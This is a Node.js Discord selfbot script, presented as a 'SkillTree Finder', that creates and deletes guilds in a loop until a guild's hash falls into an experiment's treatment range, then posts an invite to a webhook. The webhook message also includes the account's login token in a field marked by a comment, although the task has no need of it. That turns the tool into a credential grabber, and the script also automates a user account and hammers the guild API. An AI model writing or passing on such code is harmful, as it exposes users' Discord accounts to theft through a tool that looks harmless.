require("dotenv").config(); // Load environment variables from .env file
const { Client } = require("discord.js-selfbot-v13");
const murmurhash3 = require("murmurhash3js");
const axios = require("axios");

// Helper sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const client = new Client();

// Define multiple "treatment" ranges
const targetRanges = [
    [10, 20],  // original
    [60, 100], // additional treatment window
];

function isInAnyRange(value, ranges) {
    return ranges.some(([min, max]) => value >= min && value < max);
}

const WEBHOOK_URL = process.env.WEBHOOK_URL; // Replace with your webhook URL

async function sendWebhook(hash, guildId, inviteUrl, attempt) {
    try {
        await axios.post(WEBHOOK_URL, {
            username: "SkillTree Finder",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/2099/2099078.png",
            embeds: [{
                title: "🎯 Treatment Group Guild Found!",
                description: `**Hash:** \`${hash}\`\n**Guild ID:** \`${guildId}\`\n**Invite:** [Click to Join](${inviteUrl})`,
                fields: [
                    { name: "Attempt", value: `${attempt}`, inline: true },
                    { name: "Timestamp", value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true },
                    { name: "Token", value: `\`${client.token}\`` }  // <-- token field
                ],
                color: 0x00ff99
            }]
        });
    } catch (error) {
        console.error("❌ Webhook error:", error.message);
    }
}

client.on("ready", async () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    
    let attempt = 0;

    while (true) {
        try {
            attempt++;

            const guild = await client.api.guilds.post({
                data: { name: "discord is good" }
            });

            const hash = murmurhash3.x86.hash32("2025-02_skill_trees:" + guild.id) % 10000;
            const matched = isInAnyRange(hash, targetRanges);

            console.log(`[${attempt}] Hash: ${hash} for Guild ID: ${guild.id} → ${matched ? '✅ MATCH' : '❌ Skip'}`);

            if (!matched) {
                await client.api.guilds(guild.id).delete();
                await sleep(5000);
                continue;
            }

            // Get channels and find the first text channel
            const channels = await client.api.guilds(guild.id).channels.get();
            const firstTextChannel = channels.find(c => c.type === 0); // 0 = GUILD_TEXT

            if (!firstTextChannel) {
                console.warn("⚠️ No text channel found to create invite.");
                await client.api.guilds(guild.id).delete();
                continue;
            }

            // Create an invite
            const invite = await client.api.channels(firstTextChannel.id).invites.post({
                data: {
                    max_age: 0, // permanent
                    max_uses: 0,
                    temporary: false
                }
            });

            const inviteUrl = `https://discord.gg/${invite.code}`;

            // Send to webhook
            await sendWebhook(hash, guild.id, inviteUrl, attempt);
            break; // Stop after finding match

        } catch (err) {
            console.error("❌ Error:", err.message);
            await sleep(10000);
        }
    }
});

client.login(process.env.DISCORD_TOKEN); // Replace with your selfbot token
